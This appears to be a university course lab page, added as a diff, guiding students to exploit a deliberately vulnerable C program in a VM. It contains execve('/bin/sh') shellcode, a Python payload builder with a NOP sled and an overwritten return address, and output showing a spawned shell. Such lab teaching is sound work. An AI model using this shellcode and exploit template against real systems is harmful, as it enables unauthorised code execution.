@@ -1,0 +1,307 @@
+---
+layout: ../../../layouts/CryptoCourseMarkdown.astro
+---
+
+import UsedIn from "../../../components/UsedIn.jsx";
+
+# Project: Buffer Overflow (VM version)
+
+<UsedIn>[Fall 2023](/fall2023) (as Project 9)</UsedIn>
+
+
+## Preliminary Setup
+
+This project is can be completed by running virtual machine that we have prebuilt for you.  You can find the details of how to get it up and runing  [HERE](/crypto-course/projects/virtual-machine-setup) **.  You are welcome to install the virtual machine on inside your CS account, or anywhere you have access to a commputer that you can run virtualbox on.  You can also install the software manually on any linux system you have administrative access to.
+
+A buffer-overflow protection normally used in modern operating systems is Address Space Layout Randomization (ASLR).  This permutes the virtual address mapping of each segment of your program, every time it is run.  Your VM should already be configured with ASLR disabled, meaning each time you run `overflow`, all the addresses will be the same. If you find that the addresses are changing, run the following command to disable ASLR:
+
+```
+sudo sysctl kernel.randomize_va_space=0
+```
+
+## Objectives
+
+* Understand what a buffer overflow attack is and how to prevent it.
+* Gain experience performing buffer overflow attacks yourself.
+
+## Overview
+
+One of the most common ways to store data in a program is through the use of a **buffer**. Often, a buffer is used to store data provided by the user through the command line. A program may prompt the user for a password, which is then stored in a buffer for later hashing and/or comparing.
+
+However, while useful, buffers can also make your program vulnerable. Without the proper precautions, a malicious actor could exploit your program with a *buffer overflow attack*. 
+
+To demonstrate, here's some example C code:
+
+```
+char inputBuffer[10];
+printf("Give me a word: ");
+gets(userInput);
+```
+
+This small program asks the user for a word, then saves it in `inputBuffer`. The buffer can store 10 characters, but what happens when the user inputs more than 10?
+
+When the information to be stored in a buffer is larger than the size of the buffer itself, it begins to overwrite other things on the stack, such as the values stored in registers. One key thing you could overwrite is the return address of a function. If you can change where a function returns to, you can control the flow of the program itself, skipping password checkers and injecting your own code to be run.
+
+## Your Turn
+
+You have been given a compiled C program called `overflow` 
+
+  [overflow](/code/crypto-course/buffer-overflow-2023/overflow) (Linux Binary - right click link to 'save-as')
+
+  [overflow.c](/code/crypto-course/buffer-overflow-2023/overflow.c) (source code - right click link to 'save-as')
+
+that is vulnerable to a buffer overflow attack. The program will ask you to input your name, save your input to a buffer, then print out "Thank you `<name>`, have a nice day!" However, the creator of this program accidently left in a function called `vulnerable` that was used for testing purposes. This function opens up a new shell, which would allow access to all the files on the computer!
+
+The `vulnerable` function is never actually called by the program. Your mission is to exploit the buffer overflow to make the program run the `vulnerable` function and open a shell.
+
+## Section A
+
+First, use a debugger to overwrite the return address in order to run the `vulnerable` function. In `gdb`, you can find a valid address to return to by running `disassemble vulnerable`. You can also set a breakpoint at the beginning of the function to find an address.
+
+For this section, write a paragraph explaining how you wrote a new return address on the stack. Include a screenshot of you doing this and then opening a shell.
+
+## Section B
+
+Now cause the program to run `vulnerable` without using the debugger. Instead, exploit the buffer overflow vulnerability to overwrite the return address on the stack.
+
+For this section, turn in a screenshot showing you doing this.
+
+## Section C 
+
+Most often, there won't be a vulnerable function you can jump to that will just spawn a shell using a readily available `/bin/sh` string. In those scenarios, you have to resort to other methods.
+
+One such method is called `shellcode injection`. This refers to passing along with our overwritten instruction pointer, some machine code into the vulnerable buffer. You make the function's saved \$RIP  point to  that buffer so that when your function returns, it runs your own code. 
+
+**NOTE:** The version of overflow2 and overflow2.c that is included in this year's VM should be discarded.  USE THIS VERSION INSTEAD.
+
+The new program you will be working with does not have an easy-to-call function, meaning you will have to inject some shellcode into the buffer.
+
+Here some shellcode  (From https://www.exploit-db.com/exploits/46907) that opens a shell using `/bin/sh` 
+
+```
+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+```
+
+See the link for a few more details.
+
+It eventually does the equivalent of 'execve("/bin/sh", NULL, NULL);' in C.  If this program were running remotely, you could remotely execute your own code,  or if this program ran on your local machine with escalated privileges, you would end up running a copy of the system shell, with the privileges of the running code.
+
+You can see many more examples of "shellcode" at https://shell-storm.org/shellcode/index.html - for a variety of operating systems, processors, and functionality.  Some of the code will just echo the contents of a file (to get you hashes, or maybe a database password?) or will open a reverse-shell listening on a port, or send an email etc.
+
+The creation of shellcode is a non-trivial task - but you could learn if it interests you.  You could become a penetration-tester or maybe work for your favorite government TLA.
+
+1. You have been provided with  a test C program that will define and run a copy of the shell code:
+[shell code test C program](/code/crypto-course/buffer-overflow-2023/shell_test.c) (right click link to 'save-as')
+
+   Take a look at the file and see if you can understand what is going on - it defines a function pointer that points to the assembly code stored in a buffer allocated as a local variable - on the stack.  Build this code, in the virtual machine, run:  `gcc shell_test.c -o shell_test -g -fno-stack-protector -z execstack`   and run the code.  It should look something like:
+
+   ```
+   ┌──(student㉿kali)-[~/465-projects/buffer_overflow/]
+   └─$ ./shell_test
+   $ env
+   PWD=/home/student/465-projects/buffer_overflow/
+   ```
+
+   Note the difference in the shell prompt - this new shell has very few environment variables set, and a very small \$PATH - you would have to run commands by full-path-name.  In this case, it's a subshell, so type `exit` to get back to your original shell
+
+2. Get a copy of the program you will be exploiting and running this shellcode in.
+   [overflow2.c](/code/crypto-course/buffer-overflow-2023/overflow2.c) (right click link to 'save-as')
+
+    Build this similarly:  `gcc overflow2.c -o overflow2 -g -fno-stack-protector -z execstack`
+
+    This program takes a single command line argument and then copies it into a buffer unsafely, prints a message and then returns.  It also prints some debug information intended to make this project a little easier - you normally  might not have the source code or the debugging info from a real program.  It's possible to overcome those issues, but it's a bit more work.
+  
+    overflow2.c
+
+```
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+
+    int main(int argc, char **argv) {
+        char nameBuffer[100];
+
+        if (argc < 2) {
+            printf("Usage: %s yourname\n", argv[0]);
+            printf("Please enter your name for registration purposes.");
+            exit(1);
+        }
+        else {
+                printf("nameBuffer address: %p\n", (void *)nameBuffer);
+                strcpy(nameBuffer, argv[1]);
+        }
+
+        printf("Thank you %s, have a nice day!\n", nameBuffer);
+    }
+```
+
+  Play with the program by providing it command line arguments and observe it's behavior.  Try entering longer and longer inputs up to about 140  (40 bytes past the end of nameBuffer).  See what happens.
+
+  While doing this, at the same time in a separate terminal window, run (and leave running) the following command:
+
+  `dmesg -H -W`
+
+  Once you get to long enough inputs that the program crashes, you will see OS/system errors printing to the kernel log that may look like:
+
+  `[Nov13 15:45] traps: overflow2[62534] general protection fault ip:7fffffff4141 sp:7fffffffe140 error:0 `
+
+  It might be helpful to use the same character, slowly incrementing the number of them.  You can use perl or python one-liners to do this inline:
+
+  ### background
+
+```
+  Some perl one-liners:
+
+  perl -e 'print "AAAAAAAA"'
+  perl -e 'print "AAAA" . "BBBB"'
+  perl -e 'print "AAAA" x 4'
+  perl -e 'print "\xf0\xd0\xff\xff"'   (to enter address xffffd0f0, notice address backwards - little endian)
+  perl -e 'print "\xf0\xd0\xff\xff"x20'    (repeat address 20 times)
+  perl -e 'print "\x90" x 200'                   (NOP repeated 200 times)
+
+  Something equivalent in python3
+
+  python -c 'import sys; stuff = b"A" * 30; sys.stdout.buffer.write(stuff)'
+  python -c 'import sys; stuff = b"\x90" * 30 + b"AAAAAA"; sys.stdout.buffer.write(stuff)'
+```
+
+  You can supply the output of those commands to overflow2 like this:
+
+```
+  ./overflow2 `python -c 'import sys; stuff = b"A" * 30; sys.stdout.buffer.write(stuff)'`
+```
+
+  The backticks mean "run this code, and insert it's output here"  
+
+  You'll note that as you increase past 110 characters or so, you'll see in your 'dmesg' output in the other window some errors - you'll see that the a couple of numbers labled "sp" and "ip" - these are your crashed process stack-pointer and instruction pointer.  You'll see the instruction pointer get garbled and eventually overwritten - this means you have enough input to overwrite the saved-on-the-stack instruction pointer.
+
+  You're gong to write some input that will put your shell code in the buffer, and then overwrite the saved instruction pointer to make program control jump to your program.   There are some gotchas here - if you are handling binary data, there are some bytes that will count as whitespace (e.g. \x20) breaking your input into TWO arguments to the program.  Because of this I usually write a little python script that creates all my data so I can just put quotes around it without having to worry about shell-escaping quotes.
+
+  Since we're trying to find how many bytes past the end of the buffer we need to write to overwrite the saved \$RIP, I like to use a known payload with something I can recognize in errors (e.g. like in dmsg).  So I use AAAAAAAABBBBBB   - there are 6 B's representing the place I want to put the address in, and I increment the number of As until the BBBBBB exactly line up in my ip:XXXXXXXXX in my error message - these are ascii capitol B which are (hex) 0x42, while A is 0x41.
+
+  For example 125 bytes in the buffer:
+
+```
+  ┌──(student㉿kali)-[~/465-projects/buffer_overflow]
+  └─$ ./overflow2 `python -c 'import sys; stuff = b"A" * 125; sys.stdout.buffer.write(stuff)'`
+  nameBuffer address: 0x7fffffffe0a0
+  Thank you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, have a nice day!
+  Segmentation fault
+```
+
+  gives this error:
+
+```
+  [ +20.566468] overflow2[98673]: segfault at 4141414141 ip 0000004141414141 sp 00007fffffffe120 error 14 in overflow2[555555554000+1000] likely on CPU 1 (core 1, socket 0)
+  [  +0.000013] Code: Unable to access opcode bytes at 0x4141414117.
+```
+
+  So you can see the hex 41s (ASCII A) overwriting the instruction pointer.
+
+  Note that all the addresses we are dealing with are 6 byte addresses - in current-generation microprocessors we are really working with a 48-bit address space, not actually 64.  That means your address is 6 bytes long (6*8 == 48).
+
+3. Next, run overflow2 in gdb.  `gdb ./overflow2`  and then 
+
+  Before running, set a breakpoint just before and after the `strcpy`.  
+
+  In gdb run your program.
+
+```
+  r `python3 -c "...your stuff here...."`
+```
+
+  This will run your program supplying the command line argument from your script, just like in the shell. 
+
+  Examine the stack, and your buffer (x/ command)  and also see 'info frame'  output  (can be abbreviated `i f`)  Note that it will show you what main's saved eip is - what main will return to when it is done.  You can see that it the saved eip will change after the strcpy.  Compare the address of nameBuffer  (e.g. `print &nameBuffer`) with what the program prints to it's stdout, and compared to what you get when you run the program standalone.  Differences in the environment variables and the length of argv[0] will have an effect on stack locations of things.  In particular, GDB adds several environment variables to the set you have in the shell (in bash 'env' and in gdb 'show env').  
+
+  This whole process is doable without having C source - just disassembling the compiled binary - this is what you would normally have to do.  In this case you're getting a basic intro in to what you could do...
+
+  Here is a template of a little python script I wrote when solving this challenge:
+
+```
+#!/usr/bin/env python3
+import sys
+
+#machine code to execve("/bin/sh", NULL, NULL)  from https://www.exploit-db.com/exploits/46907
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+#the target address we want to jump to (beginning, approximately, of nameBuffer) in LE format
+#YOU NEED TO MAKE THIS BE THE ADDRESS OF nameBuffer, approximately
+target = b'\x00\x00\xff\xff\xff\x7f'
+
+#how many bytes we need to include in our payload to get 'target' written over main's saved $RIP
+#YOU HAVE TO FIND THE RIGHT OFFSET HERE
+stackspot=100
+
+#how big a noop sled we want
+#YOU MIGHT NEED TO TWEAK THIS
+sledsize = 8
+sled = b'\x90'*sledsize
+
+#some ASCII chars to fill out the buffer
+stuff = b'A' * (stackspot - len(shellcode) - len(sled))
+
+#  for this attack, the buffer looks like this:
+#  noop-sled || shellcode || stuff || target-written-over-saved-eip
+
+payload = sled + shellcode + stuff + target
+
+# write binary string to stdout raw
+sys.stdout.buffer.write(payload)
+```
+
+  You can run the program with the output of the template like this:
+
+```
+┌──(student㉿kali)-[~/465-projects/buffer_overflow]
+└─$ ./overflow2 "`./makepayload`"
+nameBuffer address: 0x7fffffffe0a0
+Thank you ��������H1�VH�/bin//shWT_j;X�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����, have a nice day!
+Segmentation fault
+```
+
+## Attack
+
+  The payload - what we will do the exploit with, will be organized like this:
+
+  sled || shellcode || junk || target
+
+  For this project, you need to figure out how many bytes you need as input to write to overwrite the instruction pointer, you need to put a payload in the buffer, and you need to put the adddress of the buffer in the right position so that your code will be executed when main() return()s.
+
+4. Make a payload of some number of A's followed by 6 Bs - and figure out exactly how many bytes you need to write to perfectly align the Bs in the instruction pointer. We'll replace the BBBBBB with the reverse (little endian) version of the address of the buffer.  Note that that address varies from run to run a little bit, based on the size of your command line arguments and environment variables.  Once you find the right number of bytes, dont' change your payload from that length, and the address should remain the same.
+
+5. Find the address of the buffer - in this case the program prints it out when it runs - see the note above about how and why it varies.  If the program didn't print this out, you could run the program in gdb to get a good estimate, of the address, and then pad your payload with a NOP sled to make sure you could easily jump into a space that works.  In this case, you can just read it from the program output.  If you are looking in GDB, you can use the 'info frame' or 'i f' command to see the current stack frame's saved eip to see this.
+
+6. Copy the python template above and make the attack - I called my file 'makepayload'  - fill in the values that we found.  You should be able to run makepayload from the command line with no arguments:
+
+```
+  ┌──(student㉿kali)-[~/465-projects/buffer_overflow]
+  └─$ ./makepayload
+  ��������H1�VH�/bin//shWT_j;X�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
+```
+
+  At ths point you should be able to make the attack:
+
+```
+┌──(student㉿kali)-[~/465-projects/buffer_overflow]
+└─$ ./overflow2 `./makepayload`
+nameBuffer address: 0x7fffffffe0a0
+Thank you ��������H1�VH�/bin//shWT_j;X�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����, have a nice day!
+$
+```
+
+You might have to adjust the target address you are trying to jump to a few times. 
+
+Once you get this working, Congrats!  You've solved your first buffer overflow challenge.  Unfortunately the program doesn't usually print for you the target address you're aiming for - you can only estimate it based on running it on your own hardware, or by static analysis and arithemetic from some other system address you were able to find out.  In this case you would use a NOP sled to increase your chances of getting your exploit to work.  This gives you a wide range of address offsets that will run successfully if you jump to them.  You can read about [nop sleds](https://en.wikipedia.org/wiki/NOP_slide) on wikipedia. 
+
+Increase your target address by 16 bytes.  Try your exploit - does it work?  Then adjust the sled size in your exploit template to 24 to and try again.  NOP sleds can make exploitation much easier. 
+
+Include your addresses, offsets, etc - what you needed to do to make your payload work in your final report.  Also include a screenshot of your success!
+
+## Helpful Resources
+
+* [gdb cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
+
+## Submission
+
+Submit a PDF of your report on Learning Suite, including all the things asked for in each section.
